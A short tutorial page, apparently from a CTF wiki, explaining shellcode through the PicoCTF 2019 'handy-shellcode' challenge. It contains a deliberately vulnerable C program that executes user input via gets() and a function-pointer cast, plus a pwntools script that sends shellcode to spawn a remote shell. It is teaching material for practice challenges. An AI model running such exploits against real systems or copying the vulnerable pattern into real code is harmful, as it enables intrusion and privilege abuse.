---
title: Shellcode
---
Shellcode is a small piece of code used in a payload, usually to spawn a shell to control the machine.
Shellcode is useful when your program runs buffers you control as a function.

## Example
Let's take a look at the following source code: (PicoCTF 2019: handy-shellcode)
```c
void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){
  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];
  puts("Enter your shellcode:");
  vuln(buf);
  puts("Thanks! Executing now...");
  ((void (*)())buf)();
  puts("Finishing Executing Shellcode. Exiting now...");
  return 0;
}
```

We can see that the code reads user input and writes it to `buf`, before running `((void (*)())buf)()`.
Let's break this line down:
1. `(void (*)())` means a pointer to function that takes no argument and returns void.
2. `((void (*)())buf)` means we're casting `buf` into said pointer.
3. `((void (*)())buf)()` means we're running `buf` which was casted to a pointer to a function, which would run the function.

Therefore, this line would run whatever code is in `buf`.

This is where shellcode would come in. We will set `buf` to the hex bytes you would get when you convert `execve("/bin/sh")` to assembly to hex bytes.
You can find shellcode samples online. Pwntools also provides shellcode samples via `asm(shellcraft.sh())`.

Here's an example solve script for the challenge:
```python
from pwn import *

r = remote("...", 1234)

r.clean()
r.sendline(asm(shellcraft.sh()))
r.clean()
r.interactive()
```

This code will spawn a shell for you to control, successfully solving the challenge.